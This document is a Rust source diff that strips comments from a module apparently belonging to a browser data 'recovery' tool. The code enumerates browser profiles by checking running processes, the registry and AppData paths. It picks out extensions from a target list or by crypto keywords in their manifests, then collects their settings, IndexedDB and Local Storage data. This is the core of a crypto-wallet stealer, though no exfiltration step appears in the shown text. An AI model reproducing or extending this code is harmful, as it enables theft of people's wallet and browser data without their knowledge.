@@ -65,7 +65,7 @@ pub enum BrowserName {
     Chromium,
     Vivaldi,
     Yandex,
-    ThreeSixty, // 360
+    ThreeSixty,
     QQ,
     CocCoc,
     NaverWhale,
@@ -325,13 +325,11 @@ impl RecoveryTask for BrowserExtensionTask {
         let indexed_db = self.profile.path.join("IndexedDB");
         let local_storage = self.profile.path.join("Local Storage").join("leveldb");
 
-        // 1. Identify Target Extensions (Whitelist + Heuristic)
         let mut target_ids = Vec::new();
         for (name, id) in TARGET_EXTENSIONS {
             target_ids.push((name.to_string(), id.to_string()));
         }
 
-        // Heuristic Discovery: Scan all extensions for crypto keywords in manifest
         let extensions_root = self.profile.path.join("Extensions");
         if let Ok(mut dir) = fs::read_dir(&extensions_root).await {
             while let Ok(Some(entry)) = dir.next_entry().await {
@@ -346,7 +344,6 @@ impl RecoveryTask for BrowserExtensionTask {
             }
         }
 
-        // 2. Capture Data for all identified IDs
         for (name, id) in target_ids {
             let extension_settings_dir = local_ext_settings.join(&id);
             if fs::metadata(&extension_settings_dir).await.is_ok() {
@@ -445,7 +442,6 @@ impl BrowserExtensionTask {
     }
 
     async fn heuristic_check_extension(&self, path: &Path) -> Option<String> {
-        // Extensions are usually Extensions/{id}/{version}/manifest.json
         if let Ok(mut dir) = fs::read_dir(path).await {
             while let Ok(Some(version_entry)) = dir.next_entry().await {
                 let manifest_path = version_entry.path().join("manifest.json");
@@ -457,7 +453,6 @@ impl BrowserExtensionTask {
                     ];
                     
                     if keywords.iter().any(|&k| content_low.contains(k)) {
-                        // Extract name from manifest
                         if let Ok(json) = serde_json::from_str::<serde_json::Value>(&content) {
                             if let Some(name) = json.get("name").and_then(|v| v.as_str()) {
                                  return Some(name.to_string());
@@ -476,7 +471,6 @@ pub async fn default_browser_tasks(ctx: &RecoveryContext) -> Vec<Arc<dyn Recover
     let mut tasks: Vec<Arc<dyn RecoveryTask>> = Vec::new();
     let mut seen_roots = HashSet::new();
 
-    // 1. Process-Based Discovery (Active Browsers)
     let running_roots = find_running_browsers(ctx);
     for (browser, root) in running_roots {
         if seen_roots.insert(root.to_string_lossy().to_string().to_lowercase()) {
@@ -490,7 +484,6 @@ pub async fn default_browser_tasks(ctx: &RecoveryContext) -> Vec<Arc<dyn Recover
         }
     }
 
-    // 2. Registry Discovery (Dynamic)
     let registry_roots = find_registry_browsers(ctx);
     for (browser, root) in registry_roots {
         if seen_roots.insert(root.to_string_lossy().to_string().to_lowercase()) {
@@ -504,7 +497,6 @@ pub async fn default_browser_tasks(ctx: &RecoveryContext) -> Vec<Arc<dyn Recover
         }
     }
 
-    // 3. Standard Path Discovery (Fallback/Manual)
     for (browser, root) in browser_data_roots(ctx) {
         if seen_roots.insert(root.to_string_lossy().to_string().to_lowercase()) {
             let profiles = BrowserProfile::discover_for_root(browser, &root).await;
@@ -523,7 +515,6 @@ pub async fn default_browser_tasks(ctx: &RecoveryContext) -> Vec<Arc<dyn Recover
 fn find_running_browsers(ctx: &RecoveryContext) -> Vec<(BrowserName, PathBuf)> {
     let mut results = Vec::new();
     
-    // We iterate through our known browsers and check if their processes are active
     let browsers = [
         BrowserName::Chrome, BrowserName::Edge, BrowserName::Brave, BrowserName::Opera,
         BrowserName::Vivaldi, BrowserName::Yandex, BrowserName::ThreeSixty, BrowserName::QQ,
@@ -533,7 +524,6 @@ fn find_running_browsers(ctx: &RecoveryContext) -> Vec<(BrowserName, PathBuf)> {
     for browser in browsers {
         let pid = super::lockedfile::proc::find_by_name(browser.process_name());
         if pid != 0 {
-            // If we found a PID, try to get its executable path
             use windows::Win32::System::Threading::{OpenProcess, PROCESS_QUERY_LIMITED_INFORMATION};
             use windows::Win32::System::ProcessStatus::K32GetModuleFileNameExW;
             use windows::Win32::Foundation::CloseHandle;
@@ -570,7 +560,6 @@ fn find_registry_browsers(ctx: &RecoveryContext) -> Vec<(BrowserName, PathBuf)> 
                 if let Ok(browser_key) = key.open_subkey(&name) {
                     if let Ok(command_key) = browser_key.open_subkey("shell\\open\\command") {
                         if let Ok(exe_path_raw) = command_key.get_value::<String, _>("") {
-                            // Clean "path/to/exe" --args
                             let exe_path = exe_path_raw.trim_matches('"').split(".exe").next().map(|s| format!("{}.exe", s)).unwrap_or(exe_path_raw);
                             let exe_path = PathBuf::from(exe_path);
                             
@@ -608,8 +597,6 @@ fn match_browser_by_path(path: &Path) -> Option<BrowserName> {
 }
 
 fn resolve_data_root(ctx: &RecoveryContext, browser: BrowserName, _exe_path: &Path) -> Option<PathBuf> {
-    // For installed browsers, data is almost always in AppData regardless of install drive
-    // We reuse the standard roots but this allows us to confirm they exist if registry says browser is there.
     let roots = browser_data_roots(ctx);
     roots.into_iter().find(|(b, _)| *b as usize == browser as usize).map(|(_, p)| p)
 }
